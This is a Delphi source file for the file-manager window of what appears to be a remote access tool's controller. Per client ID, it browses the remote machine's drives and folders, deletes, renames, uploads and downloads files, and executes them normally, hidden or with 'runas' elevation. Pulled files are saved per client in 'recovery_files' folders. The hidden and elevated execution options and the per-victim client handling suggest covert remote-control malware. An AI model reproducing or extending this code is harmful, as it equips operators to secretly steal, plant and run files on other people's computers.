unit UnitFileManager;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.ComCtrls, Vcl.ExtCtrls,
  Vcl.Menus, System.JSON, ncLines, System.UITypes, System.NetEncoding, System.IOUtils, System.DateUtils;

type
  TSendJSONProc = procedure(aLine: TncLine; JSONObj: TJSONObject) of object;
  TUnregisterFormProc = procedure(aLine: TncLine) of object;

  TForm9 = class(TForm)
    ListView1: TListView;
    Panel1: TPanel;
    StatusBar1: TStatusBar;
    Edit1: TEdit;
    Geri: TButton;
    Yenile: TButton;
    PopupMenu1: TPopupMenu;
    Delete1: TMenuItem;
    Delete2: TMenuItem;
    Download1: TMenuItem;
    NewFolder1: TMenuItem;
    Rename1: TMenuItem;
    Upload1: TMenuItem;
    Copy1: TMenuItem;
    Paste1: TMenuItem;
    Normal1: TMenuItem;
    Normal2: TMenuItem;
    RunAs1: TMenuItem;
    procedure Delete1Click(Sender: TObject);
    procedure Rename1Click(Sender: TObject);
    procedure Normal1Click(Sender: TObject);
    procedure Normal2Click(Sender: TObject);
    procedure RunAs1Click(Sender: TObject);
    procedure NewFolder1Click(Sender: TObject);
    procedure Download1Click(Sender: TObject);
    procedure Upload1Click(Sender: TObject);
    procedure Copy1Click(Sender: TObject);
    procedure Paste1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure GeriClick(Sender: TObject);
    procedure YenileClick(Sender: TObject);
    procedure ListView1DblClick(Sender: TObject);
    procedure Edit1KeyDown(Sender: TObject; var Key: Word; Shift: TShiftState);
  private
    FLine: TncLine;
    FClientID: string;
    FOnSendJSON: TSendJSONProc;
    FOnUnregister: TUnregisterFormProc;

    FCurrentPath: string;
    FLastStatus: string;
    FLastLogTime: TDateTime;
    procedure LogToStatus(const Msg: string);
    procedure Timer1Timer(Sender: TObject);
  public
    procedure SetupForClient(aLine: TncLine; const aClientID: string;
      aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
    procedure HandleFileManagerJSON(JSONObj: TJSONObject);
    procedure DetachCallbacks;
    procedure RequestDrives;
    procedure RequestDirectory(const Path: string);
  end;

var
  Form9: TForm9;

implementation

{$R *.dfm}

procedure TForm9.SetupForClient(aLine: TncLine; const aClientID: string;
  aSendJSONProc: TSendJSONProc; aUnregisterProc: TUnregisterFormProc);
begin
  FLine := aLine;
  FClientID := aClientID;
  FOnSendJSON := aSendJSONProc;
  FOnUnregister := aUnregisterProc;

  Caption := 'File Manager - ' + FClientID;
  FCurrentPath := '';
  Edit1.Text := '';
  ListView1.Items.Clear;
  FLastStatus := 'Folders [0] Files [0]';
  StatusBar1.SimpleText := FLastStatus;

  OnClose := FormClose;
  Geri.OnClick := GeriClick;
  Yenile.OnClick := YenileClick;
  ListView1.OnDblClick := ListView1DblClick;
  Edit1.OnKeyDown := Edit1KeyDown;
end;

procedure TForm9.DetachCallbacks;
begin
  FLine := nil;
  FOnSendJSON := nil;
  FOnUnregister := nil;
end;

procedure TForm9.LogToStatus(const Msg: string);
begin
  FLastLogTime := Now;
  TThread.Queue(nil,
    procedure
    begin
      if Assigned(StatusBar1) then
        StatusBar1.SimpleText := Msg;
    end);

  TThread.CreateAnonymousThread(
    procedure
    begin
      Sleep(3000);
      TThread.Queue(nil,
        procedure
        begin
          if Assigned(StatusBar1) and (MilliSecondsBetween(Now, FLastLogTime) >= 3000) then
            StatusBar1.SimpleText := FLastStatus;
        end);
    end).Start;
end;

procedure TForm9.Timer1Timer(Sender: TObject);
begin
  // Placeholder for potential future timer logic
end;

procedure TForm9.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  if Assigned(FOnUnregister) and Assigned(FLine) then
    FOnUnregister(FLine);
  Action := caFree;
end;

procedure TForm9.RequestDrives;
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getdrives');
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RequestDirectory(const Path: string);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'getfiles');
    JSONObj.AddPair('path', Path);
    FOnSendJSON(FLine, JSONObj);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.HandleFileManagerJSON(JSONObj: TJSONObject);
var
  Action: string;
  Items: TJSONArray;
  i: Integer;
  ItemObj: TJSONObject;
  LItem: TListItem;
  FCount, DCount: Integer;
begin
  if not Assigned(JSONObj) then Exit;

  Action := '';
  if Assigned(JSONObj.Values['type']) then
    Action := JSONObj.Values['type'].Value;

  if SameText(Action, 'drives') then
  begin
    Items := JSONObj.Values['drives'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCurrentPath := '';
      Edit1.Text := '';
      for i := 0 to Items.Count - 1 do
      begin
        LItem := ListView1.Items.Add;
        LItem.Caption := Items.Items[i].Value;
        LItem.SubItems.Add(''); // Date
        LItem.SubItems.Add('Drive');
        LItem.SubItems.Add(''); // Size
        LItem.ImageIndex := -1;
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    FLastStatus := 'Drives listed';
    if (MilliSecondsBetween(Now, FLastLogTime) >= 3000) then
      StatusBar1.SimpleText := FLastStatus;
  end
  else if SameText(Action, 'files') then
  begin
    FCurrentPath := JSONObj.Values['path'].Value;
    Edit1.Text := FCurrentPath;
    Items := JSONObj.Values['files'] as TJSONArray;
    ListView1.Items.BeginUpdate;
    try
      ListView1.Items.Clear;
      FCount := 0;
      DCount := 0;
      // First pass: Folders
      for i := 0 to Items.Count - 1 do
      begin
        ItemObj := Items.Items[i] as TJSONObject;
        if SameText(ItemObj.Values['type'].Value, 'Folder') then
        begin
          LItem := ListView1.Items.Add;
          LItem.Caption := ItemObj.Values['name'].Value;
          LItem.SubItems.Add(ItemObj.Values['date'].Value);
          LItem.SubItems.Add(ItemObj.Values['type'].Value);
          LItem.SubItems.Add(ItemObj.Values['size'].Value);
          Inc(DCount);
        end;
      end;
      // Second pass: Files
      for i := 0 to Items.Count - 1 do
      begin
        ItemObj := Items.Items[i] as TJSONObject;
        if not SameText(ItemObj.Values['type'].Value, 'Folder') then
        begin
          LItem := ListView1.Items.Add;
          LItem.Caption := ItemObj.Values['name'].Value;
          LItem.SubItems.Add(ItemObj.Values['date'].Value);
          LItem.SubItems.Add(ItemObj.Values['type'].Value);
          LItem.SubItems.Add(ItemObj.Values['size'].Value);
          Inc(FCount);
        end;
      end;
    finally
      ListView1.Items.EndUpdate;
    end;
    FLastStatus := Format('Folders [%d] Files [%d]', [DCount, FCount]);
    if (MilliSecondsBetween(Now, FLastLogTime) >= 3000) then
      StatusBar1.SimpleText := FLastStatus;
  end
  else if SameText(Action, 'log') then
  begin
    LogToStatus(JSONObj.Values['message'].Value);
  end
  else if SameText(Action, 'download') then
  begin
    var LFileName := JSONObj.Values['name'].Value;
    var LBase64Data := JSONObj.Values['data'].Value;
    var LClientID := FClientID;

    TThread.CreateAnonymousThread(
      procedure
      var
        LRawData: TBytes;
        LSavePath: string;
        LMS: TMemoryStream;
      begin
        try
          LRawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(LBase64Data));

          if Length(LRawData) > (50 * 1024 * 1024) then
          begin
            TThread.Queue(nil, procedure begin if Assigned(Form9) then Form9.LogToStatus('Download failed: Decoded file exceeds 50MB'); end);
            Exit;
          end;

          LSavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
          LSavePath := TPath.Combine(LSavePath, LClientID);
          LSavePath := TPath.Combine(LSavePath, 'recovery_files');

          if not TDirectory.Exists(LSavePath) then
            TDirectory.CreateDirectory(LSavePath);

          LSavePath := TPath.Combine(LSavePath, LFileName);

          LMS := TMemoryStream.Create;
          try
            if Length(LRawData) > 0 then
              LMS.WriteBuffer(LRawData[0], Length(LRawData));
            LMS.SaveToFile(LSavePath);
          finally
            LMS.Free;
          end;

          TThread.Queue(nil, procedure begin if Assigned(Form9) then Form9.LogToStatus('Downloaded: ' + LFileName); end);
        except
          on E: Exception do
          begin
            var LError := E.Message;
            TThread.Queue(nil, procedure begin if Assigned(Form9) then Form9.LogToStatus('Download processing error: ' + LError); end);
          end;
        end;
      end).Start;
  end;
end;

procedure TForm9.GeriClick(Sender: TObject);
var
  P: string;
begin
  if (FCurrentPath = '') or (Length(FCurrentPath) <= 3) then
  begin
    RequestDrives;
    Exit;
  end;

  P := ExcludeTrailingPathDelimiter(FCurrentPath);
  P := ExtractFilePath(P);

  if (P = '') or (Length(P) < 2) then
    RequestDrives
  else
    RequestDirectory(P);
end;

procedure TForm9.YenileClick(Sender: TObject);
begin
  if FCurrentPath = '' then
    RequestDrives
  else
    RequestDirectory(FCurrentPath);
end;

procedure TForm9.ListView1DblClick(Sender: TObject);
var
  LItem: TListItem;
  Name, FType: string;
begin
  LItem := ListView1.Selected;
  if not Assigned(LItem) then Exit;

  Name := LItem.Caption;
  FType := LItem.SubItems[1];

  if SameText(FType, 'Drive') then
    RequestDirectory(Name)
  else if SameText(FType, 'Folder') then
    RequestDirectory(IncludeTrailingPathDelimiter(FCurrentPath) + Name)
  else
  begin
    // It's a file, default action: Normal Execute
    Normal1Click(nil);
  end;
end;

procedure TForm9.Edit1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if Key = VK_RETURN then
  begin
    if Trim(Edit1.Text) = '' then
      RequestDrives
    else
      RequestDirectory(Edit1.Text);
  end;
end;

procedure TForm9.Copy1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'copyfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Copied to clipboard');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Delete1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  if MessageDlg('Are you sure you want to delete this?', mtConfirmation, [mbYes, mbNo], 0) <> mrYes then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'deletefile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Deleting: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Download1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'downloadfile');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Downloading: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.NewFolder1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  FolderName: string;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  FolderName := InputBox('New Folder', 'Enter folder name:', 'New Folder');
  if FolderName = '' then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'createfolder');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + FolderName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Creating folder...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'normal');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing: ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Normal2Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'hidden');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (Hidden): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Paste1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'pastefile');
    JSONObj.AddPair('path', FCurrentPath);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Pasting file...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Rename1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
  NewName: string;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  NewName := InputBox('Rename', 'Enter new name:', ListView1.Selected.Caption);
  if (NewName = '') or (NewName = ListView1.Selected.Caption) then Exit;

  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'rename');
    JSONObj.AddPair('oldpath', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('newpath', IncludeTrailingPathDelimiter(FCurrentPath) + NewName);
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Renaming: ' + ListView1.Selected.Caption + '...');
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.RunAs1Click(Sender: TObject);
var
  JSONObj: TJSONObject;
begin
  if (ListView1.Selected = nil) or not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
  JSONObj := TJSONObject.Create;
  try
    JSONObj.AddPair('action', 'execute');
    JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + ListView1.Selected.Caption);
    JSONObj.AddPair('mode', 'runas');
    FOnSendJSON(FLine, JSONObj);
    LogToStatus('Executing (RunAs): ' + ListView1.Selected.Caption);
  finally
    JSONObj.Free;
  end;
end;

procedure TForm9.Upload1Click(Sender: TObject);
var
  OpenDlg: TOpenDialog;
  LFileName, LDestPath: string;
begin
  if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;

  OpenDlg := TOpenDialog.Create(nil);
  try
    if OpenDlg.Execute then
    begin
      LFileName := OpenDlg.FileName;
      LDestPath := IncludeTrailingPathDelimiter(FCurrentPath) + TPath.GetFileName(LFileName);

      if TFile.GetSize(LFileName) > (50 * 1024 * 1024) then
      begin
        MessageBox(Handle, 'File size exceeds 50MB limit.', 'Upload Error', MB_OK or MB_ICONERROR);
        Exit;
      end;

      LogToStatus('Uploading: ' + TPath.GetFileName(LFileName) + '...');

      TThread.CreateAnonymousThread(
        procedure
        var
          LFileBytes: TBytes;
          LBase64Str: string;
          LJSONObj: TJSONObject;
          LCurrentLine: TncLine;
          LSendJSON: TSendJSONProc;
        begin
          try
            LFileBytes := TFile.ReadAllBytes(LFileName);
            LBase64Str := TNetEncoding.Base64.EncodeBytesToString(LFileBytes);
            LBase64Str := LBase64Str.Replace(#13, '').Replace(#10, '');

            LJSONObj := TJSONObject.Create;
            try
              LJSONObj.AddPair('action', 'uploadfile');
              LJSONObj.AddPair('path', LDestPath);
              LJSONObj.AddPair('data', LBase64Str);

              TThread.Synchronize(nil,
                procedure
                begin
                  LCurrentLine := FLine;
                  LSendJSON := FOnSendJSON;
                end);

              if Assigned(LSendJSON) and Assigned(LCurrentLine) then
                LSendJSON(LCurrentLine, LJSONObj);
            finally
              LJSONObj.Free;
            end;
          except
            on E: Exception do
            begin
              var LError := E.Message;
              TThread.Queue(nil, procedure begin if Assigned(Form9) then Form9.LogToStatus('Upload failed: ' + LError); end);
            end;
          end;
        end).Start;
    end;
  finally
    OpenDlg.Free;
  end;
end;

end.

